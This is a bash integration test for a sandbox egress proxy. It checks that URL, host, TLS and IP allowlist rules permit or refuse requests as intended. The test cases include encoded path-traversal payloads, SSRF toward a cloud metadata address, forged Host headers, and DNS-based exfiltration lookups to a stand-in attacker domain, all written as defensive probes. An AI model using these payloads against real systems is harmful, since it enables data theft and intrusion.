#!/bin/bash
# Runs inside the sandbox, as the `run:` input of a real proxy_engine:
# inspect step (see test/integration-test-inspect-restrict.sh). One shell
# script covers every case: isolated-run's rootfs is the real host, so there
# is no per-step image layer to assert on.
#
# ---------------------------------------------------------------------------
# Rules under test (set by test/integration-test-inspect-restrict.sh):
#   allowed_url_rules:
#     GET https://allowed.example.com/public/**
#     GET https://allowed.example.com:9443/public/**
#     GET|POST https://api.example.com/v1/*
#     GET http://10.200.0.100/pub-by-addr/**
#     GET https://*.wildcard.example.com/public/**
#     GET ~^https://blocked\.example\.com:9443/public/.*$
#     GET ~^https://blocked\.example\.com/defaultport/.*$
#     GET ~https://ok\.wildcard\.example\.com/regexpub/        (no anchors)
#     GET ~^https://ok\.wildcard\.example\.com/regexexact$
#   allowed_https_rules: sub.wildcard.example.com:443 absent.example.com:443 v6only.example.com:443 metadata.example.com:443 runner.example.com:443 deadend.example.com:443
#   allowed_http_rules:  allowed.example.com:80 deadend.example.com:80
#   allowed_tls_rules:     tlspass.example.com:443 ~^tlspass\.example\.com:8443$
#   allowed_ip_rules:    ~^10\.200\.0\.\d+:9080$ 10.200.0.53:53
# ---------------------------------------------------------------------------
set -uo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/helpers.sh"

S="curl -sS --max-time 10"
# Deliberately unquoted here: $C is expanded unquoted below (word-split into
# argv), so a literal quote around %{http_code} would become part of the
# argument itself instead of being stripped; see the direct curl calls
# further down, where it's a single literal invocation and quoting is correct.
C="curl -sS -o /dev/null -w %{http_code} --max-time 10"

echo "=== [URL rule - path allowed] ==="
OUT=$($S https://allowed.example.com/public/pkg.tgz)
check_ok "GET /public/pkg.tgz" "$OUT" "PUBLIC GET"

echo "=== [URL rule - path not allowed] ==="
CODE=$($C https://allowed.example.com/private/secret)
check_status "GET /private/secret" "$CODE" "403"

echo "=== [URL rule - method not allowed] ==="
CODE=$($C -X POST https://allowed.example.com/public/pkg.tgz)
check_status "POST /public/pkg.tgz" "$CODE" "403"

echo "=== [URL rule - method allowed] ==="
OUT=$($S -X POST https://api.example.com/v1/thing)
check_ok "POST /v1/thing" "$OUT" "API POST"

echo "=== [Traversal - normalised before the rules see it] ==="
CODE=$($C https://allowed.example.com/public/../private/secret)
check_status "GET /public/../private/secret" "$CODE" "403"

# RFC 9112 §3.2.4's asterisk-form: a request-target that is not a path, so it
# matches no rule and is refused. The point of the case is the report, which
# must name allowed.example.com rather than a host built from an empty path.
echo "=== [Request target is not a path] ==="
CODE=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 10 \
       -X OPTIONS --request-target '*' https://allowed.example.com/)
check_status "OPTIONS *" "$CODE" "403"

echo "=== [Traversal, encoded] ==="
for P in "%2e%2e/private/secret" "%2e%2e%2fprivate/secret" \
         "%2E%2E%2Fprivate/secret" "..%2fprivate/secret"; do
  CODE=$(curl -sS -o /dev/null -w '%{http_code}' --path-as-is --max-time 10 \
         "https://allowed.example.com/public/$P")
  check_status "GET /public/$P" "$CODE" "403"
done

echo "=== [Traversal, backslash] ==="
for P in "x/..%5c../private/secret" "x/%2e%2e%5cprivate/secret" \
         "x/..\\../private/secret" "x/\\..\\../private/secret"; do
  CODE=$(curl -sS -o /dev/null -w '%{http_code}' --path-as-is --max-time 10 \
         "https://allowed.example.com/public/$P")
  check_status "GET /public/$P" "$CODE" "403"
done

# Tomcat and Jetty read `..;/` as `../`. This origin does not, so the 403 is
# what is under test.
echo "=== [Traversal, path parameter] ==="
for P in "..;/private/secret" "..%3b/private/secret" "..%3B/private/secret" \
         "..;jsessionid=x/private/secret" "%2e%2e;/private/secret"; do
  CODE=$(curl -sS -o /dev/null -w '%{http_code}' --path-as-is --max-time 10 \
         "https://allowed.example.com/public/$P")
  check_status "GET /public/$P" "$CODE" "403"
done

echo "=== [Not traversal] ==="
for P in "@scope%2fpkg" "my..pkg" "pkg.tgz" "a%5cb" "pkg;v=1"; do
  OUT=$(curl -sS --path-as-is --max-time 10 "https://allowed.example.com/public/$P")
  check_ok "GET /public/$P" "$OUT" "PUBLIC"
done

echo "=== [Non-standard TLS port 9443] ==="
OUT=$($S https://allowed.example.com:9443/public/pkg.tgz)
check_ok "GET :9443/public/pkg.tgz" "$OUT" "PUBLIC GET"

# blocked.example.com is otherwise always refused (see [Blocked host]
# below), so reaching it here proves the ~regex rule itself granted access.
echo "=== [Regex URL rule - host, port and path all matched] ==="
OUT=$($S https://blocked.example.com:9443/public/pkg.tgz)
check_ok "GET blocked.example.com:9443/public/pkg.tgz" "$OUT" "PUBLIC GET"

echo "=== [Regex URL rule - path not allowed] ==="
CODE=$($C https://blocked.example.com:9443/private/secret)
check_status "GET blocked.example.com:9443/private/secret" "$CODE" "403"

# Same host and path, default port instead of the rule's 9443: a ~regex rule
# that failed to carry its port into a real restriction would wrongly let
# this through as "any port".
echo "=== [Regex URL rule - default port not covered by the literal-port rule] ==="
CODE=$($C https://blocked.example.com/public/pkg.tgz)
check_status "GET blocked.example.com/public/pkg.tgz" "$CODE" "403"

# A separate ~regex rule on blocked.example.com, /defaultport/ this time,
# names no port at all. It must match the default port (443) and nothing
# else: a bare/full check that always resolved "true" would wrongly let
# 9443 through too.
echo "=== [Regex URL rule - no port names the default port only] ==="
OUT=$($S https://blocked.example.com/defaultport/pkg.tgz)
check_ok "GET blocked.example.com/defaultport/pkg.tgz" "$OUT" "ROOT GET"

echo "=== [Regex URL rule - portless rule does not also grant a non-default port] ==="
CODE=$($C https://blocked.example.com:9443/defaultport/pkg.tgz)
check_status "GET blocked.example.com:9443/defaultport/pkg.tgz" "$CODE" "403"

echo "=== [Regex URL rule - host anchored, path left open] ==="
OUT=$($S https://ok.wildcard.example.com/regexpub/deep/pkg.tgz)
check_ok "GET ok.wildcard.example.com/regexpub/deep/pkg.tgz" "$OUT" "ROOT GET"

echo "=== [Regex URL rule - neighbouring host refused] ==="
CODE=$($C https://not-ok.wildcard.example.com/regexpub/pkg.tgz)
check_status "GET not-ok.wildcard.example.com/regexpub/pkg.tgz" "$CODE" "403"

echo "=== [Regex URL rule - author's trailing anchor honoured] ==="
OUT=$($S https://ok.wildcard.example.com/regexexact)
check_ok "GET ok.wildcard.example.com/regexexact" "$OUT" "ROOT GET"

echo "=== [Regex URL rule - longer path not covered by the anchored rule] ==="
CODE=$($C https://ok.wildcard.example.com/regexexactly)
check_status "GET ok.wildcard.example.com/regexexactly" "$CODE" "403"

echo "=== [Host rule] ==="
OUT=$($S -X DELETE https://sub.wildcard.example.com/anything/at/all)
check_ok "DELETE sub.wildcard.example.com" "$OUT" "ROOT DELETE"

echo "=== [Wildcard host + path rule - path outside the rule] ==="
CODE=$($C https://attacker.wildcard.example.com/private/secret)
check_status "GET attacker.wildcard.example.com/private/secret" "$CODE" "403"

echo "=== [Wildcard host + path rule - path allowed] ==="
OUT=$($S https://attacker.wildcard.example.com/public/pkg.tgz)
check_ok "GET attacker.wildcard.example.com/public/pkg.tgz" "$OUT" "PUBLIC GET"

echo "=== [Plaintext host rule] ==="
OUT=$($S http://allowed.example.com/public/pkg.tgz)
check_ok "GET http://allowed.example.com/public/pkg.tgz" "$OUT" "PUBLIC GET"

echo "=== [Blocked host - the full URL, incl. query, is what gets recorded] ==="
CODE=$($C "https://blocked.example.com/exfil?token=SECRET-VALUE")
check_status "GET blocked.example.com/exfil?token=..." "$CODE" "403"

# A release asset's signed URL runs to about a kilobyte, past the length
# haproxy cuts a log line at by default. The marker is last on the logged line,
# so the assertion in integration-test-inspect-restrict.sh finding it proves
# the whole line was recorded.
echo "=== [Blocked host - a URL the size a signed one really is] ==="
PAD=$(awk 'BEGIN{s="";while(length(s)<1200)s=s "A";print s}')
CODE=$($C "https://blocked.example.com/exfil?pad=$PAD&end=TAIL-MARKER")
check_status "GET blocked.example.com/exfil?pad=<1.2KB>&end=TAIL-MARKER" "$CODE" "403"

# Allowlisted and resolvable, with nothing listening there. The connection
# never completes, so no certificate is ever accepted on it, and
# integration-test-inspect-restrict.sh checks that is reported as a refusal
# rather than as an outage.
echo "=== [Origin connection never completes] ==="
CODE=$($C https://deadend.example.com/)
check_status "GET deadend.example.com" "$CODE" "503"

# The same host over plaintext, where no certificate was ever going to be
# checked. That one is an outage and nothing more, which is the distinction
# integration-test-inspect-restrict.sh checks the report keeps.
echo "=== [Plaintext origin connection never completes] ==="
CODE=$($C http://deadend.example.com/)
check_status "GET http://deadend.example.com" "$CODE" "503"

echo "=== [Allowlisted name that does not resolve] ==="
CODE=$($C https://absent.example.com/)
check_status "GET absent.example.com" "$CODE" "502"

# Refused like an absent name, and on every attempt rather than sometimes.
echo "=== [Allowlisted name with AAAA records only] ==="
CODE=$($C https://v6only.example.com/)
check_status "GET v6only.example.com" "$CODE" "502"

echo "=== [Name outside the allowlist is not even looked up] ==="
CODE=$($C https://notallowed.example.com/)
check_status "GET notallowed.example.com" "$CODE" "403"

# A client that completes the handshake and then leaves without sending a
# request. Pinning a key the generated certificate cannot have stops curl at
# exactly that point (exit 90); in the wild it is an image with no CA store.
# integration-test-inspect-restrict.sh checks the report calls it neither
# allowed nor blocked.
echo "=== [Client leaves before sending a request] ==="
curl -sS -o /dev/null --max-time 10 \
  --pinnedpubkey "sha256//47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=" \
  https://aborted.example.com/
check_status "GET aborted.example.com" "$?" "90"

# [Bytes that are not an HTTP request, on a port no allowed_ip_rules or
# allowed_tls_rules entry covers: anything that is not a TLS handshake reaches
# the plain stage, which reads it as a request and refuses it.
# integration-test-inspect-restrict.sh checks the report counts that refusal.]
echo "=== [Not an HTTP request at all] ==="
((printf 'NOT-HTTP\r\n\r\n'; sleep 1) | nc -w 5 10.200.0.100 5432 > /dev/null 2>&1 || true)
echo "  bytes sent (a blocked row expected in the report)"

# [A request that parsed and named no host, which the stage refuses ahead of
# the rules: there is nothing to match and nothing to resolve. The inspect
# counterpart of universal-restrict-scenarios.sh's own case.]
echo "=== [HTTP - missing-host-header] ==="
((printf 'GET /public/pkg.tgz HTTP/1.0\r\n\r\n'; sleep 1) | nc -w 5 allowed.example.com 80 > /dev/null 2>&1 || true)
echo "  request sent (a blocked row expected in the report)"

echo "=== [Forged Host - the destination is not the client's to choose] ==="
OUT=$($S --insecure -H 'Host: allowed.example.com' https://10.200.0.101/public/pkg.tgz)
case "$OUT" in
  PUBLIC\ GET*) echo "  PASS  forged Host reached the resolved origin, not the impostor" ;;
  IMPOSTOR*)
    fail "forged Host reached the address the client chose (impostor)"
    ;;
  *)
    fail "forged Host -- unexpected body: $OUT"
    ;;
esac

echo "=== [TLS passthrough] ==="
OUT=$($S --insecure https://tlspass.example.com/public/x)
check_ok "GET tlspass.example.com (passthrough)" "$OUT" "PUBLIC GET"

# Same host as [TLS passthrough], a second port only the ~regex rule names.
echo "=== [Regex TLS rule] ==="
OUT=$($S --insecure https://tlspass.example.com:8443/public/x)
check_ok "GET tlspass.example.com:8443 (passthrough)" "$OUT" "PUBLIC GET"

echo "=== [DNS-only exfiltration] ==="
(nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
echo "  queried (checked in the report, see integration-test-inspect-restrict.sh)"

# Nothing in the cage has a name, so the only question is how the lookup ends.
# A query the resolver leaves unhandled is answered SERVFAIL, which musl reads
# as a server that may yet answer: it retries and then waits out its whole
# five-second timeout, once for every tool that reverse-resolves its own
# address or the gateway's. NXDOMAIN is final and costs nothing.
echo "=== [Reverse lookup] ==="
RDNS_OUT=$(nslookup 198.19.255.1 2>&1 || true)
case "$RDNS_OUT" in
  *NXDOMAIN*) echo "  PASS  the reverse lookup was refused outright" ;;
  *)
    fail "the reverse lookup was not answered NXDOMAIN -- got: $RDNS_OUT"
    ;;
esac

# Only a name that is an address backwards counts as a reverse lookup. The verb
# those are logged under is one the report drops, so appending `.in-addr.arpa`
# to an exfiltration name must not be a way out of the report.
echo "=== [Reverse zone, invented name] ==="
(nslookup SECRET-IN-A-NAME.in-addr.arpa >/dev/null 2>&1 || true)
echo "  queried (checked in the report, see integration-test-inspect-restrict.sh)"

# apt asks for this on every repository it fetches from, and falls back to the
# plain name when nothing comes back. The lookup works; reporting it as blocked
# would fail a step that ran fine.
echo "=== [Service discovery, host allowed] ==="
(nslookup -type=SRV _http._tcp.allowed.example.com >/dev/null 2>&1 || true)
echo "  queried (checked in the report, see integration-test-inspect-restrict.sh)"

# Prefixing `_a._tcp.` must not be a way out of the report, so the verb above
# is held to names under a host the rules allow.
echo "=== [Service discovery, host not allowed] ==="
(nslookup -type=SRV _mongodb._tcp.SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
echo "  queried (checked in the report, see integration-test-inspect-restrict.sh)"

echo "=== [Address in a URL rule] ==="
OUT=$($S http://10.200.0.100/pub-by-addr/x)
check_ok "GET http://10.200.0.100/pub-by-addr/x" "$OUT" "ROOT GET"

echo "=== [Address, path outside the rule] ==="
CODE=$($C http://10.200.0.100/private/secret)
check_status "GET http://10.200.0.100/private/secret" "$CODE" "403"

# Not an address, however much it looks like one. Each falls through to the
# resolver, which cannot answer it either.
echo "=== [Address-shaped but invalid] ==="
for H in 999.1.2.3 010.0.0.1 1.2.3.4.evil.example; do
  CODE=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 10 \
         --resolve "$H:80:10.200.0.100" "http://$H/pub-by-addr/x")
  check_status "GET http://$H/pub-by-addr/x" "$CODE" "403"
done

# Port 9080, distinct from the :80 the URL rule above already allows, so
# reaching it proves this ~regex allowed_ip_rules entry's own doing.
echo "=== [Regex IP rule] ==="
OUT=$($S http://10.200.0.100:9080/anything)
check_ok "GET http://10.200.0.100:9080/anything" "$OUT" "ROOT GET"

# Same address, on a port only the URL rule's :80 default would cover:
# refusing it proves the ~regex ip rule's own literal port (9080) is
# enforced, not "any port".
echo "=== [Regex IP rule - other port not covered] ==="
CODE=$($C http://10.200.0.100:8080/anything)
check_status "GET http://10.200.0.100:8080/anything" "$CODE" "403"

# [What a resolver does when a UDP answer comes back truncated. The gateway's
# :53 is CoreDNS; any other resolver's is judged by allowed_ip_rules like any
# other address. The reply opens with its length, then the query's own id.]
for R in 198.19.255.1 10.200.0.53; do
  echo "=== [DNS over TCP - $R] ==="
  ANSWER=$(timeout 5 bash -c '
    exec 3<>/dev/tcp/'"$R"'/53 || exit 1
    printf "\x00\x1d\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01" >&3
    head -c 4 <&3 | od -An -tx1' 2>/dev/null | tr -d ' \n')
  if [ "${ANSWER:4:4}" = "abcd" ]; then
    pass "a TCP lookup at $R was answered"
  else
    fail "a TCP lookup at $R went unanswered (got '$ANSWER')"
  fi
done

echo "=== [SSRF via allowlisted name resolving inward] ==="
CODE=$($C --insecure https://metadata.example.com/latest/meta-data)
check_status "GET metadata.example.com (resolves to 169.254.169.254)" "$CODE" "403"

# RFC1918 is exempt on purpose, so only the runner's address list refuses it.
echo "=== [SSRF via allowlisted name resolving back to the runner] ==="
CODE=$($C --insecure https://runner.example.com/)
check_status "GET runner.example.com (resolves to an address the runner holds)" "$CODE" "403"

echo "=== [Direct address, no ip rule] ==="
CODE=$($C http://10.200.0.101/)
check_status "GET http://10.200.0.101/ (impostor, no rule)" "$CODE" "403"

echo "=== [UDP is dropped] ==="
UDP_OUT=$(echo probe | nc -u -w 3 10.200.0.102 9999 2>/dev/null || true)
if [ -z "$UDP_OUT" ]; then
  pass "UDP to the echo server got no reply (cage drops it)"
else
  fail "UDP left the cage: got reply [$UDP_OUT]"
fi

echo "=== [DNS is the one exception] ==="
if nslookup allowed.example.com >/dev/null 2>&1; then
  pass "DNS still resolves"
else
  fail "DNS lookup failed"
fi

echo "=== [ICMP is dropped] ==="
if ping -c 1 -W 2 10.200.0.100 >/dev/null 2>&1; then
  fail "ping left the cage"
else
  pass "ping did not leave the cage"
fi

# A JVM already on the runner reads only its own keystore, so without the CA
# injected there (ca-trust.ts's writeJvmKeystoreFiles) a Java client meeting the
# proxy's re-signed certificate fails the handshake with a PKIX error. A status
# coming back proves the injected CA was trusted; a compiler-less runner (no
# javac for the single-file launcher) leaves the check inconclusive rather than
# failing, since only a real handshake failure should.
echo "=== [JVM keystore - the JVM trusts the injected CA] ==="
if ! command -v java >/dev/null 2>&1; then
  pass "no JVM on this runner; keystore injection is not exercised"
else
  JDIR=$(mktemp -d)
  cat >"$JDIR/HttpsCheck.java" <<'JAVA'
import java.net.URL;
import javax.net.ssl.HttpsURLConnection;

public class HttpsCheck {
  public static void main(String[] args) throws Exception {
    HttpsURLConnection c = (HttpsURLConnection) new URL(args[0]).openConnection();
    c.setConnectTimeout(10000);
    c.setReadTimeout(10000);
    c.connect();
    System.out.println("handshake ok, status=" + c.getResponseCode());
  }
}
JAVA
  JOUT=$(java "$JDIR/HttpsCheck.java" https://allowed.example.com/public/pkg.tgz 2>&1 || true)
  case "$JOUT" in
  *"handshake ok"*) pass "the JVM trusted the injected proxy CA" ;;
  *PKIX* | *SSLHandshake*) fail "the JVM did not trust the proxy CA: $JOUT" ;;
  *) pass "the JVM check was inconclusive (no compiler for the launcher?): $JOUT" ;;
  esac
fi

scenario_results
